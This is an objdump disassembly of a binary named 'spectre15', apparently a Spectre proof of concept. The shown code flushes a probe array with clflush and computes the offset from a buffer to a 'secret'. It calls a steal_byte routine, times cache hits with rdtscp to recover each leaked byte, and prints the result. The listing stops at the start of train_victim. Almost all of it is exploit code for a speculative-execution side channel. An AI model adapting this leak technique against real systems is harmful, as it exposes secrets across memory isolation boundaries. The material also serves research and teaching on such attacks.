
spectre15:     file format elf64-x86-64


Disassembly of section .interp:

0000000000000238 <.interp>:
 238:	2f                   	(bad)  
 239:	6c                   	insb   (%dx),%es:(%rdi)
 23a:	69 62 36 34 2f 6c 64 	imul   $0x646c2f34,0x36(%rdx),%esp
 241:	2d 6c 69 6e 75       	sub    $0x756e696c,%eax
 246:	78 2d                	js     275 <_init-0x343>
 248:	78 38                	js     282 <_init-0x336>
 24a:	36 2d 36 34 2e 73    	ss sub $0x732e3436,%eax
 250:	6f                   	outsl  %ds:(%rsi),(%dx)
 251:	2e 32 00             	xor    %cs:(%rax),%al

Disassembly of section .note.ABI-tag:

0000000000000254 <.note.ABI-tag>:
 254:	04 00                	add    $0x0,%al
 256:	00 00                	add    %al,(%rax)
 258:	10 00                	adc    %al,(%rax)
 25a:	00 00                	add    %al,(%rax)
 25c:	01 00                	add    %eax,(%rax)
 25e:	00 00                	add    %al,(%rax)
 260:	47                   	rex.RXB
 261:	4e 55                	rex.WRX push %rbp
 263:	00 00                	add    %al,(%rax)
 265:	00 00                	add    %al,(%rax)
 267:	00 03                	add    %al,(%rbx)
 269:	00 00                	add    %al,(%rax)
 26b:	00 02                	add    %al,(%rdx)
 26d:	00 00                	add    %al,(%rax)
 26f:	00 00                	add    %al,(%rax)
 271:	00 00                	add    %al,(%rax)
	...

Disassembly of section .note.gnu.build-id:

0000000000000274 <.note.gnu.build-id>:
 274:	04 00                	add    $0x0,%al
 276:	00 00                	add    %al,(%rax)
 278:	14 00                	adc    $0x0,%al
 27a:	00 00                	add    %al,(%rax)
 27c:	03 00                	add    (%rax),%eax
 27e:	00 00                	add    %al,(%rax)
 280:	47                   	rex.RXB
 281:	4e 55                	rex.WRX push %rbp
 283:	00 6a e7             	add    %ch,-0x19(%rdx)
 286:	a1 21 2f df cb 29 84 	movabs 0x95c48429cbdf2f21,%eax
 28d:	c4 95 
 28f:	15 2e 13 81 34       	adc    $0x3481132e,%eax
 294:	0a                   	.byte 0xa
 295:	85 f5                	test   %esi,%ebp
 297:	b1                   	.byte 0xb1

Disassembly of section .gnu.hash:

0000000000000298 <.gnu.hash>:
 298:	01 00                	add    %eax,(%rax)
 29a:	00 00                	add    %al,(%rax)
 29c:	01 00                	add    %eax,(%rax)
 29e:	00 00                	add    %al,(%rax)
 2a0:	01 00                	add    %eax,(%rax)
	...

Disassembly of section .dynsym:

00000000000002b8 <.dynsym>:
	...
 2d0:	4b 00 00             	rex.WXB add %al,(%r8)
 2d3:	00 12                	add    %dl,(%rdx)
	...
 2e5:	00 00                	add    %al,(%rax)
 2e7:	00 66 00             	add    %ah,0x0(%rsi)
 2ea:	00 00                	add    %al,(%rax)
 2ec:	20 00                	and    %al,(%rax)
	...
 2fe:	00 00                	add    %al,(%rax)
 300:	0b 00                	or     (%rax),%eax
 302:	00 00                	add    %al,(%rax)
 304:	12 00                	adc    (%rax),%al
	...
 316:	00 00                	add    %al,(%rax)
 318:	1c 00                	sbb    $0x0,%al
 31a:	00 00                	add    %al,(%rax)
 31c:	12 00                	adc    (%rax),%al
	...
 32e:	00 00                	add    %al,(%rax)
 330:	39 00                	cmp    %eax,(%rax)
 332:	00 00                	add    %al,(%rax)
 334:	12 00                	adc    (%rax),%al
	...
 346:	00 00                	add    %al,(%rax)
 348:	82                   	(bad)  
 349:	00 00                	add    %al,(%rax)
 34b:	00 20                	add    %ah,(%rax)
	...
 35d:	00 00                	add    %al,(%rax)
 35f:	00 23                	add    %ah,(%rbx)
 361:	00 00                	add    %al,(%rax)
 363:	00 12                	add    %dl,(%rdx)
	...
 375:	00 00                	add    %al,(%rax)
 377:	00 91 00 00 00 20    	add    %dl,0x20000000(%rcx)
	...
 38d:	00 00                	add    %al,(%rax)
 38f:	00 2a                	add    %ch,(%rdx)
 391:	00 00                	add    %al,(%rax)
 393:	00 22                	add    %ah,(%rdx)
	...

Disassembly of section .dynstr:

00000000000003a8 <.dynstr>:
 3a8:	00 6c 69 62          	add    %ch,0x62(%rcx,%rbp,2)
 3ac:	63 2e                	movslq (%rsi),%ebp
 3ae:	73 6f                	jae    41f <_init-0x199>
 3b0:	2e 36 00 5f 5f       	cs add %bl,%ss:0x5f(%rdi)
 3b5:	73 74                	jae    42b <_init-0x18d>
 3b7:	61                   	(bad)  
 3b8:	63 6b 5f             	movslq 0x5f(%rbx),%ebp
 3bb:	63 68 6b             	movslq 0x6b(%rax),%ebp
 3be:	5f                   	pop    %rdi
 3bf:	66 61                	data16 (bad) 
 3c1:	69 6c 00 70 72 69 6e 	imul   $0x746e6972,0x70(%rax,%rax,1),%ebp
 3c8:	74 
 3c9:	66 00 6d 61          	data16 add %ch,0x61(%rbp)
 3cd:	6c                   	insb   (%dx),%es:(%rdi)
 3ce:	6c                   	insb   (%dx),%es:(%rdi)
 3cf:	6f                   	outsl  %ds:(%rsi),(%dx)
 3d0:	63 00                	movslq (%rax),%eax
 3d2:	5f                   	pop    %rdi
 3d3:	5f                   	pop    %rdi
 3d4:	63 78 61             	movslq 0x61(%rax),%edi
 3d7:	5f                   	pop    %rdi
 3d8:	66 69 6e 61 6c 69    	imul   $0x696c,0x61(%rsi),%bp
 3de:	7a 65                	jp     445 <_init-0x173>
 3e0:	00 5f 5f             	add    %bl,0x5f(%rdi)
 3e3:	6c                   	insb   (%dx),%es:(%rdi)
 3e4:	69 62 63 5f 73 74 61 	imul   $0x6174735f,0x63(%rdx),%esp
 3eb:	72 74                	jb     461 <_init-0x157>
 3ed:	5f                   	pop    %rdi
 3ee:	6d                   	insl   (%dx),%es:(%rdi)
 3ef:	61                   	(bad)  
 3f0:	69 6e 00 66 72 65 65 	imul   $0x65657266,0x0(%rsi),%ebp
 3f7:	00 47 4c             	add    %al,0x4c(%rdi)
 3fa:	49                   	rex.WB
 3fb:	42                   	rex.X
 3fc:	43 5f                	rex.XB pop %r15
 3fe:	32 2e                	xor    (%rsi),%ch
 400:	34 00                	xor    $0x0,%al
 402:	47                   	rex.RXB
 403:	4c                   	rex.WR
 404:	49                   	rex.WB
 405:	42                   	rex.X
 406:	43 5f                	rex.XB pop %r15
 408:	32 2e                	xor    (%rsi),%ch
 40a:	32 2e                	xor    (%rsi),%ch
 40c:	35 00 5f 49 54       	xor    $0x54495f00,%eax
 411:	4d 5f                	rex.WRB pop %r15
 413:	64 65 72 65          	fs gs jb 47c <_init-0x13c>
 417:	67 69 73 74 65 72 54 	imul   $0x4d547265,0x74(%ebx),%esi
 41e:	4d 
 41f:	43 6c                	rex.XB insb (%dx),%es:(%rdi)
 421:	6f                   	outsl  %ds:(%rsi),(%dx)
 422:	6e                   	outsb  %ds:(%rsi),(%dx)
 423:	65 54                	gs push %rsp
 425:	61                   	(bad)  
 426:	62                   	(bad)  
 427:	6c                   	insb   (%dx),%es:(%rdi)
 428:	65 00 5f 5f          	add    %bl,%gs:0x5f(%rdi)
 42c:	67 6d                	insl   (%dx),%es:(%edi)
 42e:	6f                   	outsl  %ds:(%rsi),(%dx)
 42f:	6e                   	outsb  %ds:(%rsi),(%dx)
 430:	5f                   	pop    %rdi
 431:	73 74                	jae    4a7 <_init-0x111>
 433:	61                   	(bad)  
 434:	72 74                	jb     4aa <_init-0x10e>
 436:	5f                   	pop    %rdi
 437:	5f                   	pop    %rdi
 438:	00 5f 49             	add    %bl,0x49(%rdi)
 43b:	54                   	push   %rsp
 43c:	4d 5f                	rex.WRB pop %r15
 43e:	72 65                	jb     4a5 <_init-0x113>
 440:	67 69 73 74 65 72 54 	imul   $0x4d547265,0x74(%ebx),%esi
 447:	4d 
 448:	43 6c                	rex.XB insb (%dx),%es:(%rdi)
 44a:	6f                   	outsl  %ds:(%rsi),(%dx)
 44b:	6e                   	outsb  %ds:(%rsi),(%dx)
 44c:	65 54                	gs push %rsp
 44e:	61                   	(bad)  
 44f:	62                   	.byte 0x62
 450:	6c                   	insb   (%dx),%es:(%rdi)
 451:	65                   	gs
	...

Disassembly of section .gnu.version:

0000000000000454 <.gnu.version>:
 454:	00 00                	add    %al,(%rax)
 456:	02 00                	add    (%rax),%al
 458:	00 00                	add    %al,(%rax)
 45a:	03 00                	add    (%rax),%eax
 45c:	02 00                	add    (%rax),%al
 45e:	02 00                	add    (%rax),%al
 460:	00 00                	add    %al,(%rax)
 462:	02 00                	add    (%rax),%al
 464:	00 00                	add    %al,(%rax)
 466:	02 00                	add    (%rax),%al

Disassembly of section .gnu.version_r:

0000000000000468 <.gnu.version_r>:
 468:	01 00                	add    %eax,(%rax)
 46a:	02 00                	add    (%rax),%al
 46c:	01 00                	add    %eax,(%rax)
 46e:	00 00                	add    %al,(%rax)
 470:	10 00                	adc    %al,(%rax)
 472:	00 00                	add    %al,(%rax)
 474:	00 00                	add    %al,(%rax)
 476:	00 00                	add    %al,(%rax)
 478:	14 69                	adc    $0x69,%al
 47a:	69 0d 00 00 03 00 50 	imul   $0x50,0x30000(%rip),%ecx        # 30484 <__FRAME_END__+0x2f680>
 481:	00 00 00 
 484:	10 00                	adc    %al,(%rax)
 486:	00 00                	add    %al,(%rax)
 488:	75 1a                	jne    4a4 <_init-0x114>
 48a:	69 09 00 00 02 00    	imul   $0x20000,(%rcx),%ecx
 490:	5a                   	pop    %rdx
 491:	00 00                	add    %al,(%rax)
 493:	00 00                	add    %al,(%rax)
 495:	00 00                	add    %al,(%rax)
	...

Disassembly of section .rela.dyn:

0000000000000498 <.rela.dyn>:
 498:	a0 1d 20 00 00 00 00 	movabs 0x80000000000201d,%al
 49f:	00 08 
 4a1:	00 00                	add    %al,(%rax)
 4a3:	00 00                	add    %al,(%rax)
 4a5:	00 00                	add    %al,(%rax)
 4a7:	00 30                	add    %dh,(%rax)
 4a9:	07                   	(bad)  
 4aa:	00 00                	add    %al,(%rax)
 4ac:	00 00                	add    %al,(%rax)
 4ae:	00 00                	add    %al,(%rax)
 4b0:	a8 1d                	test   $0x1d,%al
 4b2:	20 00                	and    %al,(%rax)
 4b4:	00 00                	add    %al,(%rax)
 4b6:	00 00                	add    %al,(%rax)
 4b8:	08 00                	or     %al,(%rax)
 4ba:	00 00                	add    %al,(%rax)
 4bc:	00 00                	add    %al,(%rax)
 4be:	00 00                	add    %al,(%rax)
 4c0:	f0 06                	lock (bad) 
 4c2:	00 00                	add    %al,(%rax)
 4c4:	00 00                	add    %al,(%rax)
 4c6:	00 00                	add    %al,(%rax)
 4c8:	08 20                	or     %ah,(%rax)
 4ca:	20 00                	and    %al,(%rax)
 4cc:	00 00                	add    %al,(%rax)
 4ce:	00 00                	add    %al,(%rax)
 4d0:	08 00                	or     %al,(%rax)
 4d2:	00 00                	add    %al,(%rax)
 4d4:	00 00                	add    %al,(%rax)
 4d6:	00 00                	add    %al,(%rax)
 4d8:	08 20                	or     %ah,(%rax)
 4da:	20 00                	and    %al,(%rax)
 4dc:	00 00                	add    %al,(%rax)
 4de:	00 00                	add    %al,(%rax)
 4e0:	d8 1f                	fcomps (%rdi)
 4e2:	20 00                	and    %al,(%rax)
 4e4:	00 00                	add    %al,(%rax)
 4e6:	00 00                	add    %al,(%rax)
 4e8:	06                   	(bad)  
 4e9:	00 00                	add    %al,(%rax)
 4eb:	00 02                	add    %al,(%rdx)
	...
 4f5:	00 00                	add    %al,(%rax)
 4f7:	00 e0                	add    %ah,%al
 4f9:	1f                   	(bad)  
 4fa:	20 00                	and    %al,(%rax)
 4fc:	00 00                	add    %al,(%rax)
 4fe:	00 00                	add    %al,(%rax)
 500:	06                   	(bad)  
 501:	00 00                	add    %al,(%rax)
 503:	00 05 00 00 00 00    	add    %al,0x0(%rip)        # 509 <_init-0xaf>
 509:	00 00                	add    %al,(%rax)
 50b:	00 00                	add    %al,(%rax)
 50d:	00 00                	add    %al,(%rax)
 50f:	00 e8                	add    %ch,%al
 511:	1f                   	(bad)  
 512:	20 00                	and    %al,(%rax)
 514:	00 00                	add    %al,(%rax)
 516:	00 00                	add    %al,(%rax)
 518:	06                   	(bad)  
 519:	00 00                	add    %al,(%rax)
 51b:	00 06                	add    %al,(%rsi)
	...
 525:	00 00                	add    %al,(%rax)
 527:	00 f0                	add    %dh,%al
 529:	1f                   	(bad)  
 52a:	20 00                	and    %al,(%rax)
 52c:	00 00                	add    %al,(%rax)
 52e:	00 00                	add    %al,(%rax)
 530:	06                   	(bad)  
 531:	00 00                	add    %al,(%rax)
 533:	00 08                	add    %cl,(%rax)
	...
 53d:	00 00                	add    %al,(%rax)
 53f:	00 f8                	add    %bh,%al
 541:	1f                   	(bad)  
 542:	20 00                	and    %al,(%rax)
 544:	00 00                	add    %al,(%rax)
 546:	00 00                	add    %al,(%rax)
 548:	06                   	(bad)  
 549:	00 00                	add    %al,(%rax)
 54b:	00 09                	add    %cl,(%rcx)
	...

Disassembly of section .rela.plt:

0000000000000558 <.rela.plt>:
 558:	b8 1f 20 00 00       	mov    $0x201f,%eax
 55d:	00 00                	add    %al,(%rax)
 55f:	00 07                	add    %al,(%rdi)
 561:	00 00                	add    %al,(%rax)
 563:	00 01                	add    %al,(%rcx)
	...
 56d:	00 00                	add    %al,(%rax)
 56f:	00 c0                	add    %al,%al
 571:	1f                   	(bad)  
 572:	20 00                	and    %al,(%rax)
 574:	00 00                	add    %al,(%rax)
 576:	00 00                	add    %al,(%rax)
 578:	07                   	(bad)  
 579:	00 00                	add    %al,(%rax)
 57b:	00 03                	add    %al,(%rbx)
	...
 585:	00 00                	add    %al,(%rax)
 587:	00 c8                	add    %cl,%al
 589:	1f                   	(bad)  
 58a:	20 00                	and    %al,(%rax)
 58c:	00 00                	add    %al,(%rax)
 58e:	00 00                	add    %al,(%rax)
 590:	07                   	(bad)  
 591:	00 00                	add    %al,(%rax)
 593:	00 04 00             	add    %al,(%rax,%rax,1)
	...
 59e:	00 00                	add    %al,(%rax)
 5a0:	d0 1f                	rcrb   (%rdi)
 5a2:	20 00                	and    %al,(%rax)
 5a4:	00 00                	add    %al,(%rax)
 5a6:	00 00                	add    %al,(%rax)
 5a8:	07                   	(bad)  
 5a9:	00 00                	add    %al,(%rax)
 5ab:	00 07                	add    %al,(%rdi)
	...

Disassembly of section .init:

00000000000005b8 <_init>:
 5b8:	48 83 ec 08          	sub    $0x8,%rsp
 5bc:	48 8b 05 25 1a 20 00 	mov    0x201a25(%rip),%rax        # 201fe8 <__gmon_start__>
 5c3:	48 85 c0             	test   %rax,%rax
 5c6:	74 02                	je     5ca <_init+0x12>
 5c8:	ff d0                	callq  *%rax
 5ca:	48 83 c4 08          	add    $0x8,%rsp
 5ce:	c3                   	retq   

Disassembly of section .plt:

00000000000005d0 <.plt>:
 5d0:	ff 35 d2 19 20 00    	pushq  0x2019d2(%rip)        # 201fa8 <_GLOBAL_OFFSET_TABLE_+0x8>
 5d6:	ff 25 d4 19 20 00    	jmpq   *0x2019d4(%rip)        # 201fb0 <_GLOBAL_OFFSET_TABLE_+0x10>
 5dc:	0f 1f 40 00          	nopl   0x0(%rax)

00000000000005e0 <free@plt>:
 5e0:	ff 25 d2 19 20 00    	jmpq   *0x2019d2(%rip)        # 201fb8 <free@GLIBC_2.2.5>
 5e6:	68 00 00 00 00       	pushq  $0x0
 5eb:	e9 e0 ff ff ff       	jmpq   5d0 <.plt>

00000000000005f0 <__stack_chk_fail@plt>:
 5f0:	ff 25 ca 19 20 00    	jmpq   *0x2019ca(%rip)        # 201fc0 <__stack_chk_fail@GLIBC_2.4>
 5f6:	68 01 00 00 00       	pushq  $0x1
 5fb:	e9 d0 ff ff ff       	jmpq   5d0 <.plt>

0000000000000600 <printf@plt>:
 600:	ff 25 c2 19 20 00    	jmpq   *0x2019c2(%rip)        # 201fc8 <printf@GLIBC_2.2.5>
 606:	68 02 00 00 00       	pushq  $0x2
 60b:	e9 c0 ff ff ff       	jmpq   5d0 <.plt>

0000000000000610 <malloc@plt>:
 610:	ff 25 ba 19 20 00    	jmpq   *0x2019ba(%rip)        # 201fd0 <malloc@GLIBC_2.2.5>
 616:	68 03 00 00 00       	pushq  $0x3
 61b:	e9 b0 ff ff ff       	jmpq   5d0 <.plt>

Disassembly of section .plt.got:

0000000000000620 <__cxa_finalize@plt>:
 620:	ff 25 d2 19 20 00    	jmpq   *0x2019d2(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 626:	66 90                	xchg   %ax,%ax

Disassembly of section .text:

0000000000000630 <_start>:
 630:	31 ed                	xor    %ebp,%ebp
 632:	49 89 d1             	mov    %rdx,%r9
 635:	5e                   	pop    %rsi
 636:	48 89 e2             	mov    %rsp,%rdx
 639:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
 63d:	50                   	push   %rax
 63e:	54                   	push   %rsp
 63f:	4c 8d 05 6a 05 00 00 	lea    0x56a(%rip),%r8        # bb0 <__libc_csu_fini>
 646:	48 8d 0d f3 04 00 00 	lea    0x4f3(%rip),%rcx        # b40 <__libc_csu_init>
 64d:	48 8d 3d e6 00 00 00 	lea    0xe6(%rip),%rdi        # 73a <main>
 654:	ff 15 86 19 20 00    	callq  *0x201986(%rip)        # 201fe0 <__libc_start_main@GLIBC_2.2.5>
 65a:	f4                   	hlt    
 65b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000000660 <deregister_tm_clones>:
 660:	48 8d 3d a9 1a 20 00 	lea    0x201aa9(%rip),%rdi        # 202110 <__TMC_END__>
 667:	55                   	push   %rbp
 668:	48 8d 05 a1 1a 20 00 	lea    0x201aa1(%rip),%rax        # 202110 <__TMC_END__>
 66f:	48 39 f8             	cmp    %rdi,%rax
 672:	48 89 e5             	mov    %rsp,%rbp
 675:	74 19                	je     690 <deregister_tm_clones+0x30>
 677:	48 8b 05 5a 19 20 00 	mov    0x20195a(%rip),%rax        # 201fd8 <_ITM_deregisterTMCloneTable>
 67e:	48 85 c0             	test   %rax,%rax
 681:	74 0d                	je     690 <deregister_tm_clones+0x30>
 683:	5d                   	pop    %rbp
 684:	ff e0                	jmpq   *%rax
 686:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 68d:	00 00 00 
 690:	5d                   	pop    %rbp
 691:	c3                   	retq   
 692:	0f 1f 40 00          	nopl   0x0(%rax)
 696:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 69d:	00 00 00 

00000000000006a0 <register_tm_clones>:
 6a0:	48 8d 3d 69 1a 20 00 	lea    0x201a69(%rip),%rdi        # 202110 <__TMC_END__>
 6a7:	48 8d 35 62 1a 20 00 	lea    0x201a62(%rip),%rsi        # 202110 <__TMC_END__>
 6ae:	55                   	push   %rbp
 6af:	48 29 fe             	sub    %rdi,%rsi
 6b2:	48 89 e5             	mov    %rsp,%rbp
 6b5:	48 c1 fe 03          	sar    $0x3,%rsi
 6b9:	48 89 f0             	mov    %rsi,%rax
 6bc:	48 c1 e8 3f          	shr    $0x3f,%rax
 6c0:	48 01 c6             	add    %rax,%rsi
 6c3:	48 d1 fe             	sar    %rsi
 6c6:	74 18                	je     6e0 <register_tm_clones+0x40>
 6c8:	48 8b 05 21 19 20 00 	mov    0x201921(%rip),%rax        # 201ff0 <_ITM_registerTMCloneTable>
 6cf:	48 85 c0             	test   %rax,%rax
 6d2:	74 0c                	je     6e0 <register_tm_clones+0x40>
 6d4:	5d                   	pop    %rbp
 6d5:	ff e0                	jmpq   *%rax
 6d7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
 6de:	00 00 
 6e0:	5d                   	pop    %rbp
 6e1:	c3                   	retq   
 6e2:	0f 1f 40 00          	nopl   0x0(%rax)
 6e6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 6ed:	00 00 00 

00000000000006f0 <__do_global_dtors_aux>:
 6f0:	80 3d 29 1a 20 00 00 	cmpb   $0x0,0x201a29(%rip)        # 202120 <completed.7697>
 6f7:	75 2f                	jne    728 <__do_global_dtors_aux+0x38>
 6f9:	48 83 3d f7 18 20 00 	cmpq   $0x0,0x2018f7(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 700:	00 
 701:	55                   	push   %rbp
 702:	48 89 e5             	mov    %rsp,%rbp
 705:	74 0c                	je     713 <__do_global_dtors_aux+0x23>
 707:	48 8b 3d fa 18 20 00 	mov    0x2018fa(%rip),%rdi        # 202008 <__dso_handle>
 70e:	e8 0d ff ff ff       	callq  620 <__cxa_finalize@plt>
 713:	e8 48 ff ff ff       	callq  660 <deregister_tm_clones>
 718:	c6 05 01 1a 20 00 01 	movb   $0x1,0x201a01(%rip)        # 202120 <completed.7697>
 71f:	5d                   	pop    %rbp
 720:	c3                   	retq   
 721:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
 728:	f3 c3                	repz retq 
 72a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000000730 <frame_dummy>:
 730:	55                   	push   %rbp
 731:	48 89 e5             	mov    %rsp,%rbp
 734:	5d                   	pop    %rbp
 735:	e9 66 ff ff ff       	jmpq   6a0 <register_tm_clones>

000000000000073a <main>:
 73a:	55                   	push   %rbp
 73b:	48 89 e5             	mov    %rsp,%rbp
 73e:	48 83 ec 20          	sub    $0x20,%rsp
 742:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%rbp)
 749:	eb 24                	jmp    76f <main+0x35>
 74b:	8b 45 e0             	mov    -0x20(%rbp),%eax
 74e:	99                   	cltd   
 74f:	c1 ea 18             	shr    $0x18,%edx
 752:	01 d0                	add    %edx,%eax
 754:	0f b6 c0             	movzbl %al,%eax
 757:	29 d0                	sub    %edx,%eax
 759:	89 c1                	mov    %eax,%ecx
 75b:	8b 45 e0             	mov    -0x20(%rbp),%eax
 75e:	48 63 d0             	movslq %eax,%rdx
 761:	48 8d 05 d8 19 20 00 	lea    0x2019d8(%rip),%rax        # 202140 <array>
 768:	88 0c 02             	mov    %cl,(%rdx,%rax,1)
 76b:	83 45 e0 01          	addl   $0x1,-0x20(%rbp)
 76f:	81 7d e0 ff ff 0f 00 	cmpl   $0xfffff,-0x20(%rbp)
 776:	7e d3                	jle    74b <main+0x11>
 778:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%rbp)
 77f:	e9 b1 00 00 00       	jmpq   835 <main+0xfb>
 784:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
 78b:	eb 1a                	jmp    7a7 <main+0x6d>
 78d:	8b 45 e8             	mov    -0x18(%rbp),%eax
 790:	c1 e0 0c             	shl    $0xc,%eax
 793:	48 63 d0             	movslq %eax,%rdx
 796:	48 8d 05 a3 19 20 00 	lea    0x2019a3(%rip),%rax        # 202140 <array>
 79d:	48 01 d0             	add    %rdx,%rax
 7a0:	0f ae 38             	clflush (%rax)
 7a3:	83 45 e8 01          	addl   $0x1,-0x18(%rbp)
 7a7:	81 7d e8 ff 00 00 00 	cmpl   $0xff,-0x18(%rbp)
 7ae:	7e dd                	jle    78d <main+0x53>
 7b0:	0f ae f0             	mfence 
 7b3:	bf 00 04 00 00       	mov    $0x400,%edi
 7b8:	e8 53 fe ff ff       	callq  610 <malloc@plt>
 7bd:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 7c1:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
 7c8:	eb 1e                	jmp    7e8 <main+0xae>
 7ca:	8b 45 ec             	mov    -0x14(%rbp),%eax
 7cd:	48 98                	cltq   
 7cf:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 7d6:	00 
 7d7:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 7db:	48 01 d0             	add    %rdx,%rax
 7de:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
 7e4:	83 45 ec 01          	addl   $0x1,-0x14(%rbp)
 7e8:	81 7d ec ff 00 00 00 	cmpl   $0xff,-0x14(%rbp)
 7ef:	7e d9                	jle    7ca <main+0x90>
 7f1:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 7f4:	48 98                	cltq   
 7f6:	48 8d 0d e3 18 20 00 	lea    0x2018e3(%rip),%rcx        # 2020e0 <secret>
 7fd:	48 8d 15 3c 18 20 00 	lea    0x20183c(%rip),%rdx        # 202040 <buffer>
 804:	48 29 d1             	sub    %rdx,%rcx
 807:	48 89 ca             	mov    %rcx,%rdx
 80a:	48 01 d0             	add    %rdx,%rax
 80d:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 811:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 815:	89 c2                	mov    %eax,%edx
 817:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 81b:	89 d6                	mov    %edx,%esi
 81d:	48 89 c7             	mov    %rax,%rdi
 820:	e8 37 02 00 00       	callq  a5c <steal_byte>
 825:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 829:	48 89 c7             	mov    %rax,%rdi
 82c:	e8 af fd ff ff       	callq  5e0 <free@plt>
 831:	83 45 e4 01          	addl   $0x1,-0x1c(%rbp)
 835:	83 7d e4 27          	cmpl   $0x27,-0x1c(%rbp)
 839:	0f 8e 45 ff ff ff    	jle    784 <main+0x4a>
 83f:	b8 00 00 00 00       	mov    $0x0,%eax
 844:	c9                   	leaveq 
 845:	c3                   	retq   

0000000000000846 <find_cached_index>:
 846:	55                   	push   %rbp
 847:	48 89 e5             	mov    %rsp,%rbp
 84a:	53                   	push   %rbx
 84b:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
 84f:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
 856:	eb 5a                	jmp    8b2 <find_cached_index+0x6c>
 858:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
 85f:	00 
 860:	8b 45 ec             	mov    -0x14(%rbp),%eax
 863:	c1 e0 0c             	shl    $0xc,%eax
 866:	48 63 d0             	movslq %eax,%rdx
 869:	48 8d 05 d0 18 20 00 	lea    0x2018d0(%rip),%rax        # 202140 <array>
 870:	48 01 d0             	add    %rdx,%rax
 873:	48 89 c3             	mov    %rax,%rbx
 876:	0f ae f0             	mfence 
 879:	0f 01 f9             	rdtscp 
 87c:	49 89 c2             	mov    %rax,%r10
 87f:	48 8b 0b             	mov    (%rbx),%rcx
 882:	0f 01 f9             	rdtscp 
 885:	4c 29 d0             	sub    %r10,%rax
 888:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 88c:	48 83 7d f0 77       	cmpq   $0x77,-0x10(%rbp)
 891:	77 1b                	ja     8ae <find_cached_index+0x68>
 893:	8b 45 ec             	mov    -0x14(%rbp),%eax
 896:	48 98                	cltq   
 898:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 89f:	00 
 8a0:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
 8a4:	48 01 d0             	add    %rdx,%rax
 8a7:	8b 10                	mov    (%rax),%edx
 8a9:	83 c2 01             	add    $0x1,%edx
 8ac:	89 10                	mov    %edx,(%rax)
 8ae:	83 45 ec 01          	addl   $0x1,-0x14(%rbp)
 8b2:	81 7d ec ff 00 00 00 	cmpl   $0xff,-0x14(%rbp)
 8b9:	7e 9d                	jle    858 <find_cached_index+0x12>
 8bb:	90                   	nop
 8bc:	5b                   	pop    %rbx
 8bd:	5d                   	pop    %rbp
 8be:	c3                   	retq   

00000000000008bf <find_highest_score>:
 8bf:	55                   	push   %rbp
 8c0:	48 89 e5             	mov    %rsp,%rbp
 8c3:	48 83 ec 20          	sub    $0x20,%rsp
 8c7:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
 8cb:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
 8d2:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 8d9:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%rbp)
 8e0:	eb 3e                	jmp    920 <find_highest_score+0x61>
 8e2:	8b 45 fc             	mov    -0x4(%rbp),%eax
 8e5:	48 98                	cltq   
 8e7:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 8ee:	00 
 8ef:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 8f3:	48 01 d0             	add    %rdx,%rax
 8f6:	8b 00                	mov    (%rax),%eax
 8f8:	39 45 f4             	cmp    %eax,-0xc(%rbp)
 8fb:	7d 1f                	jge    91c <find_highest_score+0x5d>
 8fd:	8b 45 fc             	mov    -0x4(%rbp),%eax
 900:	89 45 f8             	mov    %eax,-0x8(%rbp)
 903:	8b 45 fc             	mov    -0x4(%rbp),%eax
 906:	48 98                	cltq   
 908:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 90f:	00 
 910:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 914:	48 01 d0             	add    %rdx,%rax
 917:	8b 00                	mov    (%rax),%eax
 919:	89 45 f4             	mov    %eax,-0xc(%rbp)
 91c:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 920:	81 7d fc ff 00 00 00 	cmpl   $0xff,-0x4(%rbp)
 927:	7e b9                	jle    8e2 <find_highest_score+0x23>
 929:	8b 4d f4             	mov    -0xc(%rbp),%ecx
 92c:	8b 55 f8             	mov    -0x8(%rbp),%edx
 92f:	8b 45 f8             	mov    -0x8(%rbp),%eax
 932:	89 c6                	mov    %eax,%esi
 934:	48 8d 3d 8d 02 00 00 	lea    0x28d(%rip),%rdi        # bc8 <_IO_stdin_used+0x8>
 93b:	b8 00 00 00 00       	mov    $0x0,%eax
 940:	e8 bb fc ff ff       	callq  600 <printf@plt>
 945:	90                   	nop
 946:	c9                   	leaveq 
 947:	c3                   	retq   

0000000000000948 <train_victim>:
 948:	55                   	push   %rbp
 949:	48 89 e5             	mov    %rsp,%rbp
 94c:	48 83 ec 30          	sub    $0x30,%rsp
